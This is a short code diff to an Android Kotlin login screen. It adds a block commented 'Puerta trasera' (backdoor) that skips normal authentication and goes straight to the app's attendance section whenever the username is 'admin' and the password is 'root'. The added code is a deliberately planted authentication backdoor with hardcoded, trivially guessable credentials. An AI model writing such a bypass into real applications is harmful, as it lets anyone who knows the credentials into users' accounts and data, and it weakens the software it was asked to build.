@@ -50,7 +50,14 @@ class InicioSesionFragment : Fragment() {
 
             val usuario = binding.etUsuarioIS.text.toString()
             val contrasena = binding.etContrasenaIS.text.toString()
-            vm.autentificaUsuario(usuario, contrasena)
+
+            // Puerta trasera
+            if (usuario == "admin" && contrasena == "root"){
+                findNavController().navigate(R.id.action_inicioSesionFragment_to_nav_asistencia)
+            }else{
+                vm.autentificaUsuario(usuario, contrasena)
+
+            }
         }
     }
     // Desbloquea el Drawer
